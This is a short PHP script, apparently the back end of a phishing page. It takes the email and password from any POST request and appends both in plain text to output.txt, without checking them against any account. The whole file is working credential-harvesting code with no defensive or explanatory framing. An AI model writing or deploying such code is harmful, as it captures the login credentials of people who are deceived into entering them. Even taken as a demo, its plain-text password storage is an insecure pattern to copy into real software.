<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Write the input to a file
    $data = "Entered Email: $email\nEntered Password: $password\n";
    file_put_contents('output.txt', $data, FILE_APPEND);
}
?>
